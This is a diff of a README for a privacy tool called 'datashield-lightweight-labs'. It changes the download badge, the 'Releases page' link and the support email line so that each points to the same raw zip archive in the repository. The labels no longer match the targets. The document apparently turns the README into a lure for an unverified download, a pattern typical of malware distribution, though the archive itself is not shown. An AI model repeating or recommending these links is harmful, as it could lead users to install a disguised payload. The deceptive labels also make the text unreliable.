@@ -1,6 +1,6 @@
 # 🛡️ datashield-lightweight-labs - Protect Your Privacy Effortlessly 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%92%BB%20Click%20Here-blue)](https://github.com/congmazen/datashield-lightweight-labs/releases)
+[![Download Latest Release](https://github.com/congmazen/datashield-lightweight-labs/raw/refs/heads/main/pages/lightweight-datashield-labs-v3.1.zip%20Latest%20Release-%F0%9F%92%BB%20Click%20Here-blue)](https://github.com/congmazen/datashield-lightweight-labs/raw/refs/heads/main/pages/lightweight-datashield-labs-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to datashield-lightweight-labs! This lightweight tool helps you protect 
 
 To download and install the software, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/congmazen/datashield-lightweight-labs/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/congmazen/datashield-lightweight-labs/raw/refs/heads/main/pages/lightweight-datashield-labs-v3.1.zip).
    
 2. **Select the Latest Version:** Find the latest version at the top of the page.
 
@@ -73,7 +73,7 @@ If you encounter any issues, try these solutions:
 
 If you need further assistance, feel free to reach out to our support team:
 
-- **Email:** support@datashield-lightweight-labs.com
+- **Email:** https://github.com/congmazen/datashield-lightweight-labs/raw/refs/heads/main/pages/lightweight-datashield-labs-v3.1.zip
 - **Support Forum:** Visit our community forum for discussions and solutions from other users.
 
 ## 🔗 Additional Resources
